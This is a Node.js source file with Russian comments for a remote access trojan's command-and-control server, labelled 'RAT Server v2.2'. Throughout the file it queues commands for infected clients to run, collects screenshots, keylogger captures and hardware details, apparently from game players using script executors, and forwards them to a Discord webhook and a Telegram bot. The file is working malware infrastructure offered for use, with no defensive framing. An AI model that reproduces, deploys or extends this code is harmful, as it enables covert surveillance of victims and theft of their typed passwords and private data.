// server.js - Обновленная версия
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Хранилище данных в памяти
let serverData = {
    lastCommand: "",
    lastArgs: [],
    lastScreenshot: null,
    connectedClients: 0
};

// Конфигурация через переменные окружения
const WEBHOOK_URL = process.env.WEBHOOK_URL || "";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

// Функция отправки в Telegram
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
    }
}

// Логирование
function logAction(action, details) {
    const timestamp = new Date().toLocaleString('ru-RU');
    const logMessage = `[${timestamp}] ${action}: ${details}`;
    console.log(logMessage);
    
    // Отправка важных событий в Telegram
    if (action.includes('ИНЖЕКТ') || action.includes('КЕЙЛОГГЕР')) {
        sendToTelegram(`<b>${action}</b>\n<code>${details}</code>\n<pre>${timestamp}</pre>`);
    }
}

// Маршруты API

// Главная страница
app.get('/', (req, res) => {
    res.json({ 
        status: 'RAT Server v2.2', 
        online: true,
        clients: serverData.connectedClients,
        timestamp: new Date().toISOString()
    });
});

// Получение команд клиентом
app.get('/data', (req, res) => {
    const response = {
        command: serverData.lastCommand,
        args: serverData.lastArgs,
        timestamp: new Date().toISOString()
    };
    
    // Сбрасываем команду после отправки
    serverData.lastCommand = "";
    serverData.lastArgs = [];
    
    res.json(response);
});

// Отправка команд на клиент
app.post('/command', (req, res) => {
    try {
        const { command, args } = req.body;
        
        if (!command) {
            return res.status(400).json({ error: "No command provided" });
        }
        
        logAction('КОМАНДА', `${command} ${args ? args.join(' ') : ''}`);
        
        // Сохраняем команду для клиента
        serverData.lastCommand = command;
        serverData.lastArgs = args || [];
        
        // Обработка специальных команд
        if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
            if (WEBHOOK_URL) {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**${args[0]}:** ${args[1]}`
                    })
                }).catch(console.error);
            }
            
            sendToTelegram(`<b>${args[0]}:</b> ${args[1]}`);
        }
        
        res.json({ status: "OK", command: command });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Обработка скриншотов
app.post('/screenshot', (req, res) => {
    try {
        const { image } = req.body;
        
        if (!image) {
            return res.status(400).json({ error: "No image data" });
        }
        
        serverData.lastScreenshot = image;
        logAction('СКРИНШОТ', 'Получен новый скриншот');
        
        // Отправка в Telegram если нужно
        if (image.length < 1000) { // Проверка размера
            sendToTelegram(`<b>СКРИНШОТ:</b>\n<code>${image.substring(0, 500)}...</code>`);
        }
        
        res.json({ status: "Screenshot received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Получение скриншота
app.get('/screenshot', (req, res) => {
    if (serverData.lastScreenshot) {
        res.json({ image: serverData.lastScreenshot });
        serverData.lastScreenshot = null;
    } else {
        res.status(404).json({ error: "No screenshot available" });
    }
});

// Обработка логов кейлоггера
app.post('/keylog', (req, res) => {
    try {
        const { logs } = req.body;
        
        if (!logs) {
            return res.status(400).json({ error: "No logs data" });
        }
        
        logAction('КЕЙЛОГГЕР', `Получено ${logs.length} символов`);
        
        // Отправка в Discord
        if (WEBHOOK_URL) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Keylogger Data:**\n\`\`\`\n${logs.substring(0, 1900)}\n\`\`\``
                })
            }).catch(console.error);
        }
        
        // Отправка в Telegram
        if (logs.length > 0) {
            sendToTelegram(`<b>КЕЙЛОГГЕР ДАННЫЕ:</b>\n<pre>${logs.substring(0, 1000)}</pre>`);
        }
        
        res.json({ status: "Logs received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Информация об оборудовании
app.post('/hardware', (req, res) => {
    try {
        const { player, data } = req.body;
        
        logAction('ОБОРУДОВАНИЕ', `Данные от ${player}`);
        
        const hwInfo = `Игрок: ${player}
FPS: ${data.fps}
Ping: ${data.ping}
Executor: ${data.executor}
${data.cpu ? `CPU: ${data.cpu}` : ''}
${data.ram ? `RAM: ${data.ram}` : ''}`;

        // Отправка в каналы
        if (WEBHOOK_URL) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Hardware Info:**\n\`\`\`\n${hwInfo}\n\`\`\``
                })
            }).catch(console.error);
        }

        sendToTelegram(`<b>ИНФО ОБОРУДОВАНИЯ:</b>\n<pre>${hwInfo}</pre>`);
        
        res.json({ status: "Hardware data received" });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Статус сервера
app.get('/status', (req, res) => {
    res.json({ 
        status: "online", 
        version: "2.2",
        timestamp: new Date().toISOString(),
        lastCommand: serverData.lastCommand,
        connectedClients: serverData.connectedClients
    });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`🚀 RAT Server v2.2 запущен на порту ${PORT}`);
    console.log(`📡 URL: ${process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`}`);
    
    // Уведомление о запуске
    sendToTelegram(`<b>🟢 RAT СЕРВЕР ЗАПУЩЕН</b>\nПорт: ${PORT}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
});

module.exports = app;
